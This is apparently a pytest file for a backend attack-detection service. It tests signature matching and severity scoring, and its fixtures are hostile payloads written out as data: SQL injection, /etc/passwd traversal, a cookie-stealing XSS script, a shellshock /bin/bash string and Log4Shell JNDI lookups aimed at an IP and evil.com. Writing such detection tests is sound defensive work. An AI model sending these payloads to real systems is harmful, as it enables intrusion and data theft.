import pytest
import re
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../../services/backend"))

from app.services.attack_service import _detect_attack_pattern, _calculate_severity, process_raw_attack
from datetime import datetime


class TestDetectAttackPattern:
    def test_detects_sql_injection(self):
        payload = "GET /?id=1' OR '1'='1 HTTP/1.1"
        signatures, score = _detect_attack_pattern(payload)
        assert len(signatures) > 0
        assert "SQL Injection" in signatures[0] or score > 0

    def test_detects_path_traversal(self):
        payload = "GET /../../../etc/passwd HTTP/1.1"
        signatures, score = _detect_attack_pattern(payload)
        assert "Path Traversal" in signatures
        assert score >= 35

    def test_detects_log4shell(self):
        payload = "${jndi:ldap://45.33.12.9:1389/a}"
        signatures, score = _detect_attack_pattern(payload)
        assert "Log4Shell (CVE-2021-44228)" in signatures
        assert score >= 50

    def test_detects_xss(self):
        payload = '<script>alert(document.cookie)</script>'
        signatures, score = _detect_attack_pattern(payload)
        assert any("XSS" in s for s in signatures)
        assert score > 0

    def test_benign_payload_has_no_signatures(self):
        payload = "GET /index.html HTTP/1.1\r\nHost: example.com"
        signatures, score = _detect_attack_pattern(payload)
        # Should not trigger high-weight signatures
        assert score < 30

    def test_score_clamped_at_100(self):
        # Craft a payload that would trigger many rules
        payload = (
            "' OR '1'='1 UNION SELECT * FROM users; "
            "<script>alert(1)</script> "
            "${jndi:ldap://evil.com/x} "
            "../../etc/passwd "
            "eval(base64_decode('xxx')) "
            "() { :; }; /bin/bash"
        )
        _, score = _detect_attack_pattern(payload)
        assert score <= 100


class TestCalculateSeverity:
    def test_ssh_bonus(self):
        base = _calculate_severity(50, "SSH", "anything")
        http_base = _calculate_severity(50, "HTTP", "anything")
        assert base > http_base

    def test_dangerous_keyword_bonus(self):
        with_kw = _calculate_severity(40, "HTTP", "/bin/bash payload here")
        without_kw = _calculate_severity(40, "HTTP", "normal request data")
        assert with_kw >= without_kw

    def test_severity_never_exceeds_100(self):
        sev = _calculate_severity(95, "SSH", "eval(exec(cmd)) /etc/passwd " * 10)
        assert sev <= 100

    def test_zero_score_low_severity(self):
        sev = _calculate_severity(0, "HTTP", "GET / HTTP/1.1")
        assert sev >= 0 and sev <= 100


class TestProcessRawAttack:
    def test_returns_attack_create(self):
        raw = {
            "source_ip": "45.33.12.9",
            "source_port": 12345,
            "protocol": "HTTP",
            "payload": "GET /?id=1' OR '1'='1",
            "timestamp": datetime.utcnow().isoformat(),
        }
        result = process_raw_attack(raw)
        assert result is not None
        assert result.source_ip == "45.33.12.9"
        assert result.severity > 0

    def test_missing_ip_returns_none(self):
        raw = {"source_ip": "0.0.0.0", "source_port": 0, "protocol": "HTTP", "payload": "test"}
        result = process_raw_attack(raw)
        assert result is None
